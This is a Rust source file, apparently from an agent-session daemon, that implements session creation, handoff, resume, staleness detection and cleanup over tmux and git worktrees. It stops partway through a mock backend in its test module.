use std::collections::{HashMap, HashSet};
use std::sync::Arc;

use anyhow::{Result, anyhow, bail};
use chrono::Utc;
use pulpo_common::api::{CleanupResponse, CreateSessionRequest, HandoffSessionRequest};
use pulpo_common::event::{PulpoEvent, SessionDeletedEvent, SessionEvent};
use pulpo_common::session::{Runtime, Session, SessionStatus, meta};
use tokio::sync::broadcast;
use uuid::Uuid;

use crate::backend::Backend;
#[cfg(not(coverage))]
use crate::session::utils::create_worktree;
use crate::session::utils::{
    DOCKER_RUNTIME_REMOVED, exit_dir, find_orphan_exit_markers, find_orphan_session_logs,
    find_orphan_worktree_dirs, has_exit_marker, read_exit_code_marker, remove_exit_markers,
    remove_session_log, session_log_path, validate_runtime, validate_session_name,
    validate_workdir, worktrees_dir, wrap_command, write_secrets_file,
};
#[cfg(test)]
#[allow(unused_imports)]
use crate::session::utils::{exit_clean_marker_path, exit_code_marker_path};
use crate::store::Store;

pub(crate) use crate::session::utils::cleanup_worktree;
#[cfg(test)]
#[allow(unused_imports)]
pub(crate) use crate::session::utils::{is_shell_command, wrap_command_for_test};

#[derive(Clone)]
pub struct SessionManager {
    backend: Arc<dyn Backend>,
    store: Store,
    default_command: Option<String>,
    event_tx: Option<broadcast::Sender<PulpoEvent>>,
    node_name: String,
    /// Grace period (seconds) after session creation before staleness checks apply.
    /// Prevents race where `is_alive()` returns false before tmux is fully ready.
    stale_grace_secs: i64,
    /// When true, mirror each session's full terminal output to a per-session log
    /// file via `tmux pipe-pane`. Off by default — the capture is unbounded and
    /// fills the disk; enable only for debugging.
    capture_session_output: bool,
}

/// Result of resolving the command and description to launch a session with.
struct ResolvedCommand {
    command: String,
    description: Option<String>,
}

struct SessionCreatePlan {
    session: Session,
    backend_id: String,
    effective_workdir: String,
    final_command: String,
    secrets_file: Option<String>,
}

impl SessionManager {
    pub fn new(backend: Arc<dyn Backend>, store: Store, default_command: Option<String>) -> Self {
        Self {
            backend,
            store,
            default_command,
            event_tx: None,
            node_name: String::new(),
            stale_grace_secs: 5,
            capture_session_output: false,
        }
    }

    #[cfg(test)]
    #[must_use]
    pub const fn with_no_stale_grace(mut self) -> Self {
        self.stale_grace_secs = 0;
        self
    }

    /// Enable per-session full-output capture (`tmux pipe-pane` → `{id}.log`).
    /// Off by default; the daemon turns it on only when `capture_session_output`
    /// is set in config.
    #[must_use]
    pub const fn with_capture_session_output(mut self, enabled: bool) -> Self {
        self.capture_session_output = enabled;
        self
    }

    #[must_use]
    pub fn with_event_tx(mut self, tx: broadcast::Sender<PulpoEvent>, node_name: String) -> Self {
        self.event_tx = Some(tx);
        self.node_name = node_name;
        self
    }

    pub fn backend(&self) -> Arc<dyn Backend> {
        self.backend.clone()
    }

    fn emit_event(&self, session: &Session, previous_status: Option<SessionStatus>) {
        if let Some(tx) = &self.event_tx {
            let pr_url = session.meta_str(meta::PR_URL).map(str::to_owned);
            let error_status = session.meta_str(meta::ERROR_STATUS).map(str::to_owned);
            let event = SessionEvent {
                session_id: session.id.to_string(),
                session_name: session.name.clone(),
                status: session.status.to_string(),
                previous_status: previous_status.map(|s| s.to_string()),
                node_name: self.node_name.clone(),
                output_snippet: session.output_snapshot.clone(),
                timestamp: Utc::now().to_rfc3339(),
                git_branch: session.git_branch.clone(),
                git_commit: session.git_commit.clone(),
                git_insertions: session.git_insertions,
                git_deletions: session.git_deletions,
                git_files_changed: session.git_files_changed,
                pr_url,
                error_status,
                total_input_tokens: session.meta_parsed(meta::TOTAL_INPUT_TOKENS),
                total_output_tokens: session.meta_parsed(meta::TOTAL_OUTPUT_TOKENS),
                session_cost_usd: session.meta_parsed(meta::SESSION_COST_USD),
            };
            // Ignore send errors — no subscribers is OK
            let _ = tx.send(PulpoEvent::Session(event));
        }
    }

    /// Resolve the backend session ID for a session.
    /// Uses the stored `backend_session_id` if available, otherwise computes it
    /// from the session name when metadata has not recorded a provider value.
    pub fn resolve_backend_id(&self, session: &Session) -> String {
        session
            .backend_session_id
            .clone()
            .unwrap_or_else(|| self.backend.session_id(&session.name))
    }

    pub async fn create_session(&self, req: CreateSessionRequest) -> Result<Session> {
        let plan = self.build_create_plan(req, None).await?;
        self.execute_create_plan(plan).await
    }

    /// Spawn a new session that inherits a finished session's working context —
    /// its working directory, and its git worktree if it has one. Pulpo never reads
    /// or interprets any artifacts the source session left behind (e.g. a PLAN.md) —
    /// it only guarantees the next command starts in the same place.
    ///
    /// Reuses [`Self::build_create_plan`] (and therefore `wrap_command`, the secrets
    /// file, budget metadata, and idle threshold plumbing) with an adopted worktree
    /// instead of creating a new one, so this is not a parallel code path to `spawn`.
    pub async fn handoff_session(
        &self,
        source_id: &str,
        req: HandoffSessionRequest,
    ) -> Result<Session> {
        let source = self
            .store
            .get_session(source_id)
            .await?
            .ok_or_else(|| anyhow!("session not found: {source_id}"))?;

        let name = match req.name {
            Some(n) => n,
            None => self.next_handoff_name(&source.name).await?,
        };

        let adopt_worktree = match &source.worktree_path {
            Some(path) => {
                if !std::path::Path::new(path).exists() {
                    bail!(
                        "source session's worktree no longer exists on disk: {path} — cannot hand off"
                    );
                }
                let branch = source
                    .worktree_branch
                    .clone()
                    .unwrap_or_else(|| source.name.clone());
                Some((path.clone(), branch))
            }
            None => None,
        };

        let create_req = CreateSessionRequest {
            name,
            workdir: Some(source.workdir.clone()),
            command: req.command,
            description: req.description,
            metadata: None,
            idle_threshold_secs: req.idle_threshold_secs,
            worktree: None,
            worktree_base: None,
            runtime: None,
            secrets: req.secrets,
            term_program: req.term_program,
            budget_cost_usd: req.budget_cost_usd,
        };

        let plan = self.build_create_plan(create_req, adopt_worktree).await?;
        self.execute_create_plan(plan).await
    }

    /// Auto-generate a handoff session name: `{source}-2`, `{source}-3`, ... — the
    /// first suffix that doesn't collide with any existing session name (dead or
    /// alive, matching the CLI's own client-side dedup for the common no-name case).
    /// Falls back to `-100` unconditionally after 99 attempts, mirroring the CLI's
    /// `deduplicate_session_name` fallback.
    async fn next_handoff_name(&self, source_name: &str) -> Result<String> {
        for suffix in 2..=99u32 {
            let candidate = Self::handoff_suffixed_name(source_name, suffix);
            if self.store.get_session(&candidate).await?.is_none() {
                return Ok(candidate);
            }
        }
        Ok(Self::handoff_suffixed_name(source_name, 100))
    }

    /// Build `{source}-{suffix}`, truncating `source` (rather than bailing) so the
    /// result never exceeds the 128-char session-name limit.
    fn handoff_suffixed_name(source_name: &str, suffix: u32) -> String {
        let suffix_str = format!("-{suffix}");
        let max_source_len = 128usize.saturating_sub(suffix_str.len());
        let truncated: String = source_name.chars().take(max_source_len).collect();
        format!("{}{suffix_str}", truncated.trim_end_matches('-'))
    }

    /// Insert, create the backend session, and finalize — the shared tail of
    /// `create_session` and `handoff_session` once a [`SessionCreatePlan`] exists.
    async fn execute_create_plan(&self, mut plan: SessionCreatePlan) -> Result<Session> {
        self.store.insert_session(&plan.session).await?;

        if let Err(error) = self.backend.create_session(
            &plan.backend_id,
            &plan.effective_workdir,
            &plan.final_command,
        ) {
            self.cleanup_failed_create(&plan.session.id, plan.secrets_file.as_deref())
                .await?;
            return Err(error);
        }

        self.finalize_created_session(&mut plan.session, &plan.backend_id)
            .await?;
        Ok(plan.session)
    }

    #[allow(clippy::too_many_lines)]
    async fn build_create_plan(
        &self,
        req: CreateSessionRequest,
        adopt_worktree: Option<(String, String)>,
    ) -> Result<SessionCreatePlan> {
        // Validate session name: must be kebab-case (lowercase alphanumeric + hyphens).
        // This prevents shell injection via wrap_command where the name is interpolated
        // into a shell string, and matches the documented naming convention.
        validate_session_name(&req.name)?;

        // Resolve command and description: explicit request > configured default > $SHELL.
        let resolved = self.resolve_command(&req);
        let command = resolved.command;
        let description = resolved.description;

        // Default workdir to home dir
        let workdir = req.workdir.unwrap_or_else(|| {
            dirs::home_dir().map_or_else(|| "/tmp".to_owned(), |h| h.to_string_lossy().into_owned())
        });

        // Runtime: request overrides the default (tmux).
        // The docker runtime was removed — reject it wherever it comes from.
        let runtime = req.runtime.unwrap_or_default();
        validate_runtime(runtime)?;
        let wants_worktree = req.worktree.unwrap_or(false);
        validate_workdir(&workdir)?;

        // Create a git worktree if requested, or adopt one handed off from another
        // session (`pulpo handoff`) — the directory already exists, so no `git
        // worktree add` runs; the caller has already verified it's still on disk.
        let (effective_workdir, worktree_path, worktree_branch) = if let Some((path, branch)) =
            adopt_worktree
        {
            (path.clone(), Some(path), Some(branch))
        } else if wants_worktree {
            #[cfg(not(coverage))]
            {
                let wt_dir = worktrees_dir(self.store.data_dir());
                let wt_path =
                    create_worktree(&wt_dir, &workdir, &req.name, req.worktree_base.as_deref())?;
                (wt_path.clone(), Some(wt_path), Some(req.name.clone()))
            }
            #[cfg(coverage)]
            {
                (workdir.clone(), None, None)
            }
        } else {
            (workdir.clone(), None, None)
        };

        // Reject duplicate names among live sessions
        if self.store.has_active_session_by_name(&req.name).await? {
            bail!(
                "a session named '{}' is already active — stop it first or use a different name",
                req.name
            );
        }

        // Resolve secrets for injection.
        let secrets_env = if let Some(ref secret_names) = req.secrets
            && !secret_names.is_empty()
        {
            self.store.get_secrets_for_injection(secret_names).await?
        } else {
            HashMap::new()
        };

        let id = Uuid::new_v4();
        let name = req.name.clone();
        let backend_id = self.backend.session_id(&name);

        // Write secrets to a temp file. The file is sourced and immediately deleted
        // by the session shell, so secrets never appear in the command string visible
        // in `ps` or `capture-pane`.
        let secrets_file = if secrets_env.is_empty() {
            None
        } else {
            write_secrets_file(&id, &secrets_env, self.store.data_dir())?
        };

        let final_command = wrap_command(
            &command,
            &id,
            &name,
            secrets_file.as_deref(),
            req.term_program.as_deref(),
            self.store.data_dir(),
        );

        // Fold the explicit cost budget into the session metadata so the watchdog can
        // enforce it.
        let mut metadata = req.metadata.unwrap_or_default();
        if let Some(budget) = req.budget_cost_usd {
            metadata.insert(meta::BUDGET_COST_USD.to_owned(), budget.to_string());
        }

        let now = Utc::now();
        let session = Session {
            id,
            name,
            workdir: workdir.clone(),
            command,
            description,
            backend_session_id: Some(backend_id.clone()),
            metadata: Some(metadata),
            idle_threshold_secs: req.idle_threshold_secs,
            worktree_path,
            worktree_branch,
            runtime,
            created_at: now,
            updated_at: now,
            ..Default::default()
        };

        Ok(SessionCreatePlan {
            session,
            backend_id,
            effective_workdir,
            final_command,
            secrets_file,
        })
    }

    async fn cleanup_failed_create(
        &self,
        session_id: &Uuid,
        secrets_file: Option<&str>,
    ) -> Result<()> {
        if let Some(secrets_file) = secrets_file {
            let _ = std::fs::remove_file(secrets_file);
        }
        self.store
            .update_session_status(&session_id.to_string(), SessionStatus::Stopped)
            .await?;
        Ok(())
    }

    async fn finalize_created_session(
        &self,
        session: &mut Session,
        backend_id: &str,
    ) -> Result<()> {
        let id = session.id;
        let name = session.name.clone();
        // Query the tmux $N session ID and update if available
        if let Ok(tmux_id) = self.backend.query_backend_id(&name) {
            let _ = self
                .store
                .update_backend_session_id(&id.to_string(), &tmux_id)
                .await;
            session.backend_session_id = Some(tmux_id);
        }

        self.store
            .update_session_status(&id.to_string(), SessionStatus::Active)
            .await?;

        // Set up full per-session output capture only when explicitly enabled.
        // It is off by default: `tmux pipe-pane` mirrors every byte the agent
        // prints to disk unboundedly. The watchdog reads the live tail from tmux
        // scrollback, and the last output snapshot is persisted in the database,
        // so the daemon does not depend on this file for normal operation.
        if self.capture_session_output {
            let log_path = session_log_path(self.store.data_dir(), &id.to_string());
            if let Some(parent) = log_path.parent() {
                let _ = std::fs::create_dir_all(parent);
            }
            let _ = self
                .backend
                .setup_logging(backend_id, &log_path.to_string_lossy());
        }

        // Detect auth info from agent credentials and store in metadata
        #[cfg(not(coverage))]
        if let Some(auth_info) = crate::auth_info::detect_auth_for_command(&session.command) {
            let sid = id.to_string();
            let mut updates = vec![(meta::AUTH_PROVIDER, auth_info.provider.as_str())];
            if let Some(ref plan) = auth_info.plan {
                updates.push((meta::AUTH_PLAN, plan.as_str()));
            }
            if let Some(ref email) = auth_info.email {
                updates.push((meta::AUTH_EMAIL, email.as_str()));
            }
            let _ = self
                .store
                .batch_update_session_metadata(&sid, &updates, &[])
                .await;
            // Refresh session metadata to reflect the stored auth info
            if let Ok(Some(refreshed)) = self.store.get_session(&sid).await {
                session.metadata = refreshed.metadata;
            }
        }

        // Return the session with updated status (avoids unnecessary re-fetch)
        session.status = SessionStatus::Active;
        session.updated_at = Utc::now();
        self.emit_event(session, Some(SessionStatus::Creating));
        Ok(())
    }

    fn recreate_backend_session(
        &self,
        session: &Session,
        effective_workdir: &str,
        create_id: &str,
    ) -> Result<()> {
        let final_command = wrap_command(
            &session.command,
            &session.id,
            &session.name,
            None,
            None,
            self.store.data_dir(),
        );
        self.backend
            .create_session(create_id, effective_workdir, &final_command)
    }

    async fn refresh_backend_session_id(&self, session: &Session) {
        if let Ok(tmux_id) = self.backend.query_backend_id(&session.name) {
            let _ = self
                .store
                .update_backend_session_id(&session.id.to_string(), &tmux_id)
                .await;
        }
    }

    async fn mark_session_status(
        &self,
        session: &mut Session,
        previous_status: SessionStatus,
        next_status: SessionStatus,
    ) -> Result<()> {
        self.store
            .update_session_status(&session.id.to_string(), next_status)
            .await?;
        session.status = next_status;
        session.updated_at = Utc::now();
        self.emit_event(session, Some(previous_status));
        Ok(())
    }

    async fn mark_stale_in_sessions(&self, sessions: &mut [Session]) {
        for session in sessions {
            let _ = self.check_and_mark_stale(session).await;
        }
    }

    fn effective_resume_workdir(session: &Session) -> String {
        session
            .worktree_path
            .as_ref()
            .filter(|p| std::path::Path::new(p).exists())
            .cloned()
            .unwrap_or_else(|| session.workdir.clone())
    }

    fn resume_create_id(
        &self,
        session: &Session,
        backend_id: &str,
        prefer_name_for_tmux: bool,
    ) -> String {
        if prefer_name_for_tmux {
            self.backend.session_id(&session.name)
        } else {
            backend_id.to_owned()
        }
    }

    async fn restore_session_backend(
        &self,
        session: &Session,
        effective_workdir: &str,
        create_id: &str,
    ) -> Result<()> {
        // `resume_session`/`resume_lost_sessions` reuse the same session id when
        // recreating the backend (unlike `create_session`, which always mints a fresh
        // UUID). Purge any stale `.code`/`.clean` markers left over from a *previous*
        // run of this session id first — otherwise the next watchdog idle-check tick
        // could immediately (and wrongly) treat the freshly-resumed, actively-running
        // session as already finished.
        remove_exit_markers(self.store.data_dir(), &session.id.to_string());
        self.recreate_backend_session(session, effective_workdir, create_id)?;
        self.refresh_backend_session_id(session).await;
        Ok(())
    }

    fn stop_session_backend(&self, session: &Session, backend_id: &str) -> Result<()> {
        if let Err(error) = self.backend.kill_session(backend_id) {
            let name_id = self.backend.session_id(&session.name);
            if name_id != backend_id && self.backend.kill_session(&name_id).is_ok() {
                tracing::info!(
                    session = %session.name,
                    "Killed session by name after stale backend ID failed"
                );
                return Ok(());
            }

            if matches!(
                session.status,
                SessionStatus::Lost | SessionStatus::Stopped | SessionStatus::Ready
            ) {
                tracing::debug!(
                    session = %session.name,
                    error = %error,
                    "Ignoring kill error for {status} session",
                    status = session.status
                );
                return Ok(());
            }

            bail!("failed to stop session: {error}");
        }

        Ok(())
    }

    async fn mark_session_stopped(&self, session: &mut Session) -> Result<()> {
        let previous = session.status;
        self.store
            .update_session_status(&session.id.to_string(), SessionStatus::Stopped)
            .await?;
        session.status = SessionStatus::Stopped;
        self.emit_event(session, Some(previous));
        Ok(())
    }

    async fn purge_session(&self, session: &Session) -> Result<()> {
        let session_id = session.id.to_string();
        if let Some(ref wt_path) = session.worktree_path {
            if self.worktree_in_use_elsewhere(wt_path, &session_id).await? {
                tracing::debug!(
                    session = %session.name,
                    path = %wt_path,
                    "Skipping worktree cleanup — still referenced by another session"
                );
            } else {
                tracing::info!(
                    session = %session.name,
                    path = %wt_path,
                    "Cleaning up worktree after purge"
                );
                cleanup_worktree(wt_path, &session.workdir);
            }
        }
        remove_session_log(self.store.data_dir(), &session_id);
        remove_exit_markers(self.store.data_dir(), &session_id);
        self.store.delete_session(&session_id).await?;
        self.emit_session_deleted(session);
        Ok(())
    }

    /// True when another (non-dead) session still references `worktree_path` — guards
    /// against reclaiming a worktree that `pulpo handoff` made two sessions share.
    async fn worktree_in_use_elsewhere(
        &self,
        worktree_path: &str,
        exclude_id: &str,
    ) -> Result<bool> {
        let others = self
            .store
            .find_live_sessions_by_worktree(worktree_path, exclude_id)
            .await?;
        Ok(others.first().is_some_and(|other| {
            tracing::debug!("worktree still in use by {}", other.name);
            true
        }))
    }

    fn emit_session_deleted(&self, session: &Session) {
        if let Some(tx) = &self.event_tx {
            let _ = tx.send(PulpoEvent::SessionDeleted(SessionDeletedEvent {
                session_id: session.id.to_string(),
                session_name: session.name.clone(),
                node_name: self.node_name.clone(),
                timestamp: Utc::now().to_rfc3339(),
            }));
        }
    }

    /// Resolve the command to launch a session with: explicit request command takes
    /// precedence, then the configured `default_command`, then `$SHELL` (or `/bin/sh`).
    fn resolve_command(&self, req: &CreateSessionRequest) -> ResolvedCommand {
        // Explicit command takes precedence
        if let Some(ref cmd) = req.command {
            return ResolvedCommand {
                command: cmd.clone(),
                description: req.description.clone(),
            };
        }

        // No explicit command — fall back to default_command from config
        if let Some(ref default_cmd) = self.default_command {
            return ResolvedCommand {
                command: default_cmd.clone(),
                description: req.description.clone(),
            };
        }

        // No fallback available — fall back to $SHELL (or /bin/sh)
        let shell = std::env::var("SHELL").unwrap_or_else(|_| "/bin/sh".to_owned());
        ResolvedCommand {
            command: shell,
            description: req.description.clone(),
        }
    }

    pub async fn get_session(&self, id: &str) -> Result<Option<Session>> {
        let session = self.store.get_session(id).await?;
        match session {
            Some(mut s) => {
                if self.check_and_mark_stale(&mut s).await? {
                    self.emit_event(&s, Some(SessionStatus::Active));
                }
                Ok(Some(s))
            }
            None => Ok(None),
        }
    }

    pub async fn list_sessions(&self) -> Result<Vec<Session>> {
        let mut sessions = self.store.list_sessions().await?;
        self.mark_stale_in_sessions(&mut sessions).await;
        Ok(sessions)
    }

    pub async fn list_sessions_filtered(
        &self,
        query: &pulpo_common::api::ListSessionsQuery,
    ) -> Result<Vec<Session>> {
        let mut sessions = self.store.list_sessions_filtered(query).await?;
        self.mark_stale_in_sessions(&mut sessions).await;
        Ok(sessions)
    }

    /// Check if a running session is still alive; if not, mark it stale.
    /// Returns `Ok(true)` if the session was transitioned to stale.
    ///
    /// Checks `Active`, `Idle`, and `Ready` sessions — after a reboot, tmux
    /// sessions are gone but DB status may still say Idle. `Ready` is included too:
    /// a session whose agent already exited (marker written, fallback shell
    /// lingering) is still watched here, otherwise a `Ready` session whose tmux
    /// backend later dies would never be reclassified and would stay `Ready`
    /// forever whenever `ready_ttl_secs` is disabled (the default).
    ///
    /// When the backend is dead, the exit markers written by `wrap_command`
    /// (`{data_dir}/exit/{id}.code` and `{id}.clean`) decide the terminal state:
    /// their presence means the wrapped shell ran to completion on its own — an
    /// intentional end — so the session resolves to `Stopped` (with `exit_code`
    /// recorded when the `.code` marker parsed). Their absence means tmux
    /// disappeared out from under a still-running session (crash, `kill-session`,
    /// `kill-server`, reboot) with no evidence of a clean end, so it resolves to
    /// `Lost`, unchanged from before. Markers are read fresh from disk on every
    /// call, so this is race-free even across a daemon restart.
    async fn check_and_mark_stale(&self, session: &mut Session) -> Result<bool> {
        if !matches!(
            session.status,
            SessionStatus::Active | SessionStatus::Idle | SessionStatus::Ready
        ) {
            return Ok(false);
        }
        // Grace period: skip staleness check for recently created sessions to avoid a
        // race where `is_alive()` returns false before tmux is fully ready.
        let age = Utc::now() - session.created_at;
        if age.num_seconds() < self.stale_grace_secs {
            return Ok(false);
        }
        let backend_id = self.resolve_backend_id(session);
        let alive = self.backend.is_alive(&backend_id)?;
        if alive {
            return Ok(false);
        }
        self.resolve_dead_backend_session(session).await?;
        Ok(true)
    }

    /// Shared tail of `check_and_mark_stale` and `resume_lost_sessions`: a session's
    /// backend has been found dead — resolve it to `Stopped` (clean end, per an exit
    /// marker) or `Lost` (no evidence of a clean end), persisting `exit_code` when the
    /// `.code` marker parsed to a number.
    async fn resolve_dead_backend_session(&self, session: &mut Session) -> Result<()> {
        let id = session.id.to_string();
        let data_dir = self.store.data_dir();
        if has_exit_marker(data_dir, &id) {
            if let Some(code) = read_exit_code_marker(data_dir, &id) {
                self.store.update_session_exit_code(&id, code).await?;
                session.exit_code = Some(code);
            }
            self.store
                .update_session_status(&id, SessionStatus::Stopped)
                .await?;
            session.status = SessionStatus::Stopped;
        } else {
            self.store
                .update_session_status(&id, SessionStatus::Lost)
                .await?;
            session.status = SessionStatus::Lost;
        }
        Ok(())
    }

    pub async fn stop_session(&self, id: &str, purge: bool) -> Result<()> {
        let mut session = self
            .store
            .get_session(id)
            .await?
            .ok_or_else(|| anyhow!("session not found: {id}"))?;

        let backend_id = self.resolve_backend_id(&session);
        self.stop_session_backend(&session, &backend_id)?;
        self.mark_session_stopped(&mut session).await?;

        if purge {
            self.purge_session(&session).await?;
        }

        Ok(())
    }

    pub async fn cleanup_dead_sessions(&self) -> Result<CleanupResponse> {
        let data_dir = self.store.data_dir().to_owned();
        let dead_sessions = self.store.fetch_dead_sessions().await?;

        let mut worktrees_cleaned = 0u64;
        let mut logs_cleaned = 0u64;

        // 1. Reclaim worktrees + per-session log files for dead (stopped/lost) sessions.
        //    A worktree shared with another still-live session (via `pulpo handoff`)
        //    is left alone — it's reclaimed once every referencing session is dead.
        for session in &dead_sessions {
            if let Some(ref wt_path) = session.worktree_path {
                let sid = session.id.to_string();
                if self.worktree_in_use_elsewhere(wt_path, &sid).await? {
                    tracing::debug!(
                        session = %session.name,
                        path = %wt_path,
                        "Skipping worktree cleanup — still referenced by another session"
                    );
                } else {
                    cleanup_worktree(wt_path, &session.workdir);
                    worktrees_cleaned += 1;
                }
            }
            if remove_session_log(&data_dir, &session.id.to_string()) {
                logs_cleaned += 1;
            }
            if remove_exit_markers(&data_dir, &session.id.to_string()) {
                logs_cleaned += 1;
            }
        }
        let ids: Vec<String> = dead_sessions.iter().map(|s| s.id.to_string()).collect();
        if !ids.is_empty() {
            self.store.delete_sessions_bulk(&ids).await?;
            for session in &dead_sessions {
                self.emit_session_deleted(session);
            }
        }

        // 2. Safe orphan sweep: directories and log files left behind by sessions that
        //    are no longer in the database at all. A still-referenced session (any
        //    status, including active/idle/ready) is never touched.
        let remaining = self.store.list_sessions().await.unwrap_or_default();
        let referenced_worktrees: HashSet<String> = remaining
            .iter()
            .filter_map(|s| s.worktree_path.clone())
            .collect();
        let known_ids: HashSet<String> = remaining.iter().map(|s| s.id.to_string()).collect();

        for dir in find_orphan_worktree_dirs(&worktrees_dir(&data_dir), &referenced_worktrees) {
            match std::fs::remove_dir_all(&dir) {
                Ok(()) => {
                    tracing::info!(path = %dir.display(), "Removed orphaned worktree directory");
                    worktrees_cleaned += 1;
                }
                Err(e) => {
                    tracing::warn!(path = %dir.display(), error = %e, "Failed to remove orphaned worktree");
                }
            }
        }
        let logs_dir = std::path::Path::new(&data_dir).join("logs");
        for log in find_orphan_session_logs(&logs_dir, &known_ids) {
            if std::fs::remove_file(&log).is_ok() {
                logs_cleaned += 1;
            }
        }
        for marker in find_orphan_exit_markers(&exit_dir(&data_dir), &known_ids) {
            if std::fs::remove_file(&marker).is_ok() {
                logs_cleaned += 1;
            }
        }

        Ok(CleanupResponse {
            sessions_deleted: dead_sessions.len() as u64,
            worktrees_cleaned,
            logs_cleaned,
        })
    }

    pub fn capture_output(&self, id: &str, backend_id: &str, lines: usize) -> String {
        self.backend
            .capture_output(backend_id, lines)
            .unwrap_or_else(|_| self.read_log_tail(id, lines))
    }

    fn read_log_tail(&self, id: &str, lines: usize) -> String {
        let log_path = session_log_path(self.store.data_dir(), id);
        let content = std::fs::read_to_string(&log_path).unwrap_or_default();
        let mut tail: Vec<&str> = content.lines().rev().take(lines).collect();
        tail.reverse();
        tail.join("\n")
    }

    pub fn send_input(&self, backend_id: &str, text: &str) -> Result<()> {
        self.backend.send_input(backend_id, text)
    }

    pub async fn resume_session(&self, id: &str) -> Result<Session> {
        let session = self
            .store
            .get_session(id)
            .await?
            .ok_or_else(|| anyhow!("session not found: {id}"))?;

        let previous_status = session.status;
        if previous_status != SessionStatus::Lost
            && previous_status != SessionStatus::Ready
            && previous_status != SessionStatus::Stopped
        {
            bail!(
                "session cannot be resumed (status: {previous_status}) — only stopped, lost, or ready sessions can be resumed"
            );
        }

        // Historical docker-runtime sessions remain readable but cannot be resumed.
        if session.runtime == Runtime::Docker {
            bail!("{DOCKER_RUNTIME_REMOVED} — historical docker sessions cannot be resumed");
        }

        // Check for name collision with another live session (exclude self)
        if self
            .store
            .has_active_session_by_name_excluding(&session.name, Some(&session.id.to_string()))
            .await?
        {
            bail!(
                "another session named '{}' is already active — stop it first before resuming",
                session.name
            );
        }

        // Use worktree path as workdir if it still exists, otherwise fall back to original workdir.
        let effective_workdir = Self::effective_resume_workdir(&session);
        validate_workdir(&effective_workdir)?;

        // If the backend session is still alive, just re-mark it as running.
        // Only recreate the session if the backend process is gone.
        let backend_id = self.resolve_backend_id(&session);
        let alive = self.backend.is_alive(&backend_id)?;
        if !alive {
            // Use session name for the new tmux session, not the stale $N backend ID.
            // The old backend_session_id may point to a dead tmux session that no longer exists.
            let create_id = self.resume_create_id(&session, &backend_id, true);
            self.restore_session_backend(&session, &effective_workdir, &create_id)
                .await?;
        }

        let mut session = session;
        self.mark_session_status(&mut session, previous_status, SessionStatus::Active)
            .await?;
        Ok(session)
    }

    /// Resume all sessions that were Active or Idle but have dead backends, and
    /// eagerly reclassify dead `Ready` sessions (see [`Self::check_and_mark_stale`]
    /// for why `Ready` needs the same dead-backend sweep as Active/Idle). Called on
    /// startup to recover sessions lost during a reboot.
    /// Returns the number of sessions successfully resumed (`Ready` sessions are
    /// never counted — see below).
    pub async fn resume_lost_sessions(&self) -> Result<usize> {
        let sessions = self.store.list_sessions().await?;
        let mut resumed = 0;
        for mut session in sessions {
            let is_ready = session.status == SessionStatus::Ready;
            if !is_ready
                && session.status != SessionStatus::Active
                && session.status != SessionStatus::Idle
            {
                continue;
            }
            // The docker runtime was removed — historical docker sessions cannot be
            // auto-resumed in tmux. Mark them Lost so they surface in the dashboard.
            // A `Ready` session can never be docker-runtime (the runtime was removed
            // before this fix), so this only ever applies to Active/Idle.
            if !is_ready && session.runtime == Runtime::Docker {
                tracing::warn!(
                    session = %session.name,
                    "Cannot auto-resume docker-runtime session — {DOCKER_RUNTIME_REMOVED}"
                );
                self.store
                    .update_session_status(&session.id.to_string(), SessionStatus::Lost)
                    .await?;
                continue;
            }
            let backend_id = self.resolve_backend_id(&session);
            let alive = self.backend.is_alive(&backend_id).unwrap_or(false);
            if alive {
                continue;
            }
            if is_ready {
                // `Ready` sessions are never auto-resumed (recreating the backend and
                // re-launching the original command makes no sense once the agent has
                // already finished) — only ever reclassified via the exit markers,
                // eagerly here rather than waiting for the next `get_session`/
                // `list_sessions` call to lazily run the same check.
                self.resolve_dead_backend_session(&mut session).await?;
                continue;
            }
            // The session ended cleanly while the daemon wasn't polling it (either it
            // exited before pulpod stopped, or after — the marker is written by the
            // wrapper shell itself, independent of daemon uptime). Resolve it to
            // Stopped instead of blindly auto-resuming (re-launching the original
            // command) — this must be checked *before* the resume attempt below.
            if has_exit_marker(self.store.data_dir(), &session.id.to_string()) {
                self.resolve_dead_backend_session(&mut session).await?;
                continue;
            }
            // Backend is dead — resume the session
            let create_id = self.resume_create_id(&session, &backend_id, false);
            if let Err(e) = self
                .restore_session_backend(&session, &session.workdir, &create_id)
                .await
            {
                tracing::warn!(
                    session = %session.name,
                    error = %e,
                    "Failed to auto-resume session on startup"
                );
                self.store
                    .update_session_status(&session.id.to_string(), SessionStatus::Lost)
                    .await?;
                continue;
            }

            // Re-mark as Active
            self.store
                .update_session_status(&session.id.to_string(), SessionStatus::Active)
                .await?;
            tracing::info!(session = %session.name, "Auto-resumed session after restart");
            resumed += 1;
        }
        Ok(resumed)
    }

    pub const fn store(&self) -> &Store {
        &self.store
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::session::utils::{exit_clean_marker_path, exit_code_marker_path};
    use pulpo_common::event::SessionEvent;
    use std::sync::Mutex;

    /// Extract the inner `SessionEvent` from a `PulpoEvent`.
    fn unwrap_session_event(event: PulpoEvent) -> SessionEvent {
        match event {
            PulpoEvent::Session(se) => se,
            PulpoEvent::SessionDeleted(_)
            | PulpoEvent::UsageAlert(_)
            | PulpoEvent::Intervention(_) => {
                panic!("expected session event")
            }
        }
    }

    struct MockBackend {
        create_result: Mutex<Result<()>>,
        kill_result: Mutex<Result<()>>,
        alive: Mutex<bool>,
        captured_output: Mutex<String>,
        calls: Mutex<Vec<String>>,
    }

    impl MockBackend {
        fn new() -> Self {
            Self {
                create_result: Mutex::new(Ok(())),
                kill_result: Mutex::new(Ok(())),
                alive: Mutex::new(true),
                captured_output: Mutex::new("test output".into()),
                calls: Mutex::new(vec![]),
            }
        }

        fn with_create_error(self) -> Self {
            *self.create_result.lock().unwrap() = Err(anyhow!("backend not found"));
            self
        }

        fn with_kill_error(self) -> Self {
            *self.kill_result.lock().unwrap() = Err(anyhow!("kill failed"));
            self
        }

        fn with_alive(self, alive: bool) -> Self {
            *self.alive.lock().unwrap() = alive;
            self
        }
    }

    impl Backend for MockBackend {
        fn create_session(&self, name: &str, working_dir: &str, command: &str) -> Result<()> {
            self.calls
                .lock()
                .unwrap()
                .push(format!("create:{name}:{working_dir}:{command}"));
            let mut result = self.create_result.lock().unwrap();
            std::mem::replace(&mut *result, Ok(()))
        }

        fn kill_session(&self, name: &str) -> Result<()> {
            self.calls.lock().unwrap().push(format!("kill:{name}"));
            let mut result = self.kill_result.lock().unwrap();
            std::mem::replace(&mut *result, Ok(()))
        }

        fn is_alive(&self, name: &str) -> Result<bool> {
            self.calls.lock().unwrap().push(format!("is_alive:{name}"));
